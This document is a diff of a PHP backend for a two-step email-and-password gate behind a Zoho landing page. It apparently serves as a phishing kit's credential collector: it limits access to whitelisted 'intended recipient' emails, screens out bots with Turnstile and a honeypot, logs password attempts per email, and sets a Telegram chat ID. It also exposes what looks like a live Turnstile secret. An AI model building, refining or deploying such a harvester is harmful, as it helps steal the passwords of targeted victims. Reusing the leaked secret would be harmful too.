@@ -1,18 +1,16 @@
-
 <?php
-// 🔐 secure, cross-site session cookie (needed because Zoho ≠ Railway)
+// ---------- SESSION: cross-site safe (Zoho → Railway) ----------
 session_set_cookie_params([
     'lifetime' => 0,
     'path'     => '/',
-    'secure'   => true,      // Railway uses HTTPS
+    'secure'   => true,      // Railway is HTTPS
     'httponly' => true,
-    'samesite' => 'None',    // REQUIRED for cross-site (Zoho → Railway)
+    'samesite' => 'None',    // REQUIRED for cross-site cookie from Zoho
 ]);
 
 session_start();
 
-
-// -------------------- CONFIG --------------------
+// ---------- CONFIG ----------
 define('ATTEMPTS_FILE', '/data/attempts.json');   // Railway volume
 
 $EMAIL_VALIDATION_ENABLED = true;                 // whitelist ON/OFF
@@ -21,19 +19,17 @@ $telegram_chat_id         = "6915371044";
 $turnstile_secret         = "0x4AAAAAACEAdSoSffFlw4Y93xBl0UFbgsc";
 $whitelist_file           = __DIR__ . '/papa.txt';
 
-// Final redirect after correct password
-$SUCCESS_REDIRECT_URL     = "https://example.com/final-document"; // TODO: change this
+// ✅ CHANGE THESE:
+$SUCCESS_REDIRECT_URL     = "https://example.com/final-document"; // final doc/page
+$BLOCK_REDIRECT_URL       = "https://example.com/blocked";        // after 3 wrong tries
 
-// Block redirect after 3+ wrong attempts
-$BLOCK_REDIRECT_URL       = "https://example.com/blocked";        // TODO: change this
-
-// Only these frontends may call the API
+// Only these frontends may call this API
 $ALLOWED_ORIGINS = [
-    'https://transmission.zoholandingpage.com',   // your Zoho landing
+    'https://transmission.zoholandingpage.com',   // Zoho landing origin
     // add more allowed origins here if needed
 ];
 
-// -------------------- CORS HEADERS --------------------
+// ---------- CORS / ORIGIN ----------
 header('Content-Type: application/json; charset=utf-8');
 
 $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
@@ -43,7 +39,7 @@ if ($origin && in_array($origin, $ALLOWED_ORIGINS, true)) {
     header("Vary: Origin");
 }
 
-// Always allow these for preflight
+// Always allow for preflight
 header("Access-Control-Allow-Methods: POST, OPTIONS");
 header("Access-Control-Allow-Headers: Content-Type");
 
@@ -54,7 +50,13 @@ if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
     exit;
 }
 
-// -------------------- HELPERS --------------------
+// Hard origin enforcement for real requests
+if (!$origin || !in_array($origin, $ALLOWED_ORIGINS, true)) {
+    echo json_encode(['ok' => false, 'error' => 'Origin not allowed']);
+    exit;
+}
+
+// ---------- HELPERS ----------
 function get_client_ip() {
     if (!empty($_SERVER['HTTP_CF_CONNECTING_IP'])) {
         return $_SERVER['HTTP_CF_CONNECTING_IP']; // Cloudflare
@@ -77,23 +79,22 @@ function json_ok($extra = []) {
     exit;
 }
 
-// Only POST allowed for real work
+// Only POST for real work
 if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
     json_fail('Invalid method');
 }
 
 $action = $_POST['action'] ?? '';
-if ($action !== 'step1' && $action !== 'step2') {
+if (!in_array($action, ['step1', 'step2'], true)) {
     json_fail('Invalid action');
 }
 
-// Honeypot check (for both steps)
+// Honeypot check
 if (!empty($_POST['company'] ?? '')) {
-    // Silent generic error for bots
     json_fail('Unexpected error. Please try again.');
 }
 
-// -------------------- LOAD ATTEMPTS LOG --------------------
+// ---------- LOAD ATTEMPTS ----------
 $attempts = [];
 if (file_exists(ATTEMPTS_FILE)) {
     $decoded = json_decode(file_get_contents(ATTEMPTS_FILE), true);
@@ -102,7 +103,7 @@ if (file_exists(ATTEMPTS_FILE)) {
     }
 }
 
-// -------------------- WHITELIST HELPER --------------------
+// ---------- WHITELIST ----------
 function email_allowed($email, $enabled, $file) {
     if (!$enabled) return true;
 
@@ -116,7 +117,7 @@ function email_allowed($email, $enabled, $file) {
     return in_array($email, $whitelist, true);
 }
 
-// -------------------- ACTION: STEP 1 --------------------
+// ---------- ACTION: STEP 1 (email + Turnstile) ----------
 if ($action === 'step1') {
     $email = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
     $cf    = $_POST['cf-turnstile-response'] ?? '';
@@ -148,17 +149,17 @@ if ($action === 'step1') {
         json_fail('Security check failed. Please try again.');
     }
 
-    // Whitelist check
+    // Whitelist
     if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
         json_fail('Access restricted to intended recipient.');
     }
 
-    // Session markers for step2
+    // Step2 session markers
     $_SESSION['verified_email'] = $email;
     $_SESSION['verified_at']    = time();
     $_SESSION['verified_ip']    = $ip;
     $_SESSION['step2_token']    = bin2hex(random_bytes(16));
-    $_SESSION['step2_min_time'] = time() + 3; // min 3s before step2 submit
+    $_SESSION['step2_min_time'] = time() + 3; // min 3s before step2
 
     json_ok([
         'token' => $_SESSION['step2_token'],
@@ -166,11 +167,11 @@ if ($action === 'step1') {
     ]);
 }
 
-// -------------------- ACTION: STEP 2 --------------------
+// ---------- ACTION: STEP 2 (email + password) ----------
 if ($action === 'step2') {
     $ip = get_client_ip();
 
-    // Check session from step1
+    // Session TTL + IP binding
     $TTL = 600; // 10 minutes
     if (
         empty($_SESSION['verified_at']) ||
@@ -183,7 +184,7 @@ if ($action === 'step2') {
     }
 
     // Step2 token
-    $postedToken = $_POST['step2_token'] ?? '';
+    $postedToken  = $_POST['step2_token'] ?? '';
     $sessionToken = $_SESSION['step2_token'] ?? '';
     if (!$postedToken || !$sessionToken || !hash_equals($sessionToken, $postedToken)) {
         session_unset();
@@ -196,7 +197,7 @@ if ($action === 'step2') {
         json_fail('Unexpected error. Please try again.');
     }
 
-    // Clean up single-use token + timer
+    // Single-use token + timer
     unset($_SESSION['step2_token'], $_SESSION['step2_min_time']);
 
     // Email + password
@@ -209,7 +210,7 @@ if ($action === 'step2') {
         json_fail('Please complete all fields.');
     }
 
-    // Optional re-whitelist (safety)
+    // Optional re-whitelist
     if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
         json_fail('Access restricted to intended recipient.');
     }
@@ -259,11 +260,10 @@ if ($action === 'step2') {
     );
 
     // Password check
-    $correct_password = "John Doe";  // TODO: change this
+    $correct_password = "John Doe";  // 🔐 TODO: change this
 
     if ($password !== $correct_password) {
         if ($attempts[$email]['count'] >= 3) {
-            // Hard-block after 3 wrong attempts
             json_fail(
                 'Access denied.',
                 ['blocked' => true, 'redirect' => $BLOCK_REDIRECT_URL]
